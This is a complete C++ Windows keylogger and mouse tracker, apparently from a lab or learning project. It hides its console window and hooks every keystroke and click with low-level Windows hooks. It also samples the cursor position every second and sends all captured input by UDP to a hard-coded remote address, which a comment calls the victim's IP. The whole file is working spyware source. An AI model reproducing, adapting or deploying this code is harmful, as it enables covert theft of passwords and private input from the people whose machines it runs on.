#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);

int sock;
sockaddr_in server_address;

DWORD WINAPI SendMouseCoords(LPVOID lpParam)
{
	POINT p;
	while (1)
	{
		if (GetCursorPos(&p))
		{
			std::cout << p.x << " " << p.y << std::endl;
			char x[10], y[10];
			_itoa_s(p.x, x, 10);
			_itoa_s(p.y, y, 10);
			std::string coords = "[POINTER]";
			coords += x;
			coords += " ";
			coords += y;
			int result = sendto(sock, coords.c_str(), strlen(coords.c_str()), 0, (sockaddr*)&server_address, sizeof(server_address));
			if (result == SOCKET_ERROR) {
				std::cerr << "Failed to send key: " << WSAGetLastError() << std::endl;
			}
			else {
				std::cout << coords << std::endl;
				std::cout << coords.find("[POINTER]") << std::endl;
				std::cout << "Coords sent: " << std::endl;
			}
		}
		Sleep(1000);
	}
	return 0;
}

LRESULT CALLBACK MouseHookProc(int nCode, WPARAM wParam, LPARAM lParam) {

	LPMSLLHOOKSTRUCT pMouseHookParam;
	if (nCode >= 0)
	{
		pMouseHookParam = (LPMSLLHOOKSTRUCT)lParam;
		if (wParam == WM_LBUTTONDOWN)
		{
			char x[10], y[10];
			_itoa_s(pMouseHookParam->pt.x, x, 10);
			_itoa_s(pMouseHookParam->pt.y, y, 10);
			std::string coords = "[CLICK]";
			coords += x;
			coords += " ";
			coords += y;
			int result = sendto(sock, coords.c_str(), coords.length(), 0, (sockaddr*)&server_address, sizeof(server_address));
			if (result == SOCKET_ERROR) {
				std::cerr << "Failed to send key: " << WSAGetLastError() << std::endl;
			}
			else {
				std::cout << "Click sent: " << std::endl;
			}
		}
	}
	
	return nCode < 0 ? CallNextHookEx(NULL, nCode, wParam, lParam) : 0;
}

LRESULT CALLBACK KBDHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT hooklParam = (PKBDLLHOOKSTRUCT)lParam;

	switch (wParam)
	{
	case WM_KEYUP:
			char keyCode = MapVirtualKey(hooklParam->vkCode, MAPVK_VK_TO_CHAR);
			std::cout << keyCode << std::endl;
			
			int result = sendto(sock, &keyCode, 1, 0, (sockaddr*)&server_address, sizeof(server_address));
			if (result == SOCKET_ERROR) {
				std::cerr << "Failed to send key: " << WSAGetLastError() << std::endl;
			}
			else {
				std::cout << "Key sent: " << keyCode << std::endl;
			}

			
			break;
		
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(void)
{
	// mandatory for running the process in background
	ShowWindow(::GetConsoleWindow(), SW_HIDE);
	
	WSADATA wsa_data;
	int result = WSAStartup(MAKEWORD(2, 2), &wsa_data);
	if (result != 0) {
		std::cerr << "WSAStartup failed, error code: " << WSAGetLastError() << std::endl;
		return 1;
	}

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if (sock < 0) {
		std::cerr << "Failed to create socket, error code: " << WSAGetLastError() << std::endl;
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(6666);

	// replace ip address with the victim's ip
	inet_pton(AF_INET, "192.168.56.106", &server_address.sin_addr);
	
	DWORD threadId1;
	HANDLE hThread1 = CreateThread(NULL, 0, SendMouseCoords, NULL, 0, &threadId1);
	if (hThread1 == NULL)
	{
		std::cout << "Eroare la crearea threadului pentru mouse coords, cod de eroare: " << GetLastError();
		return 1;
	}
	
	HHOOK hkb = SetWindowsHookEx(WH_KEYBOARD_LL, &KBDHookProc, 0, 0);
	HHOOK mouse = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, 0, 0);
	MSG message;
	while (GetMessage(&message, NULL, NULL, NULL) > 0)
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
	
	UnhookWindowsHookEx(hkb);
	UnhookWindowsHookEx(mouse);
	CloseHandle(hThread1);
	closesocket(sock);
	WSACleanup();

	return 0;
}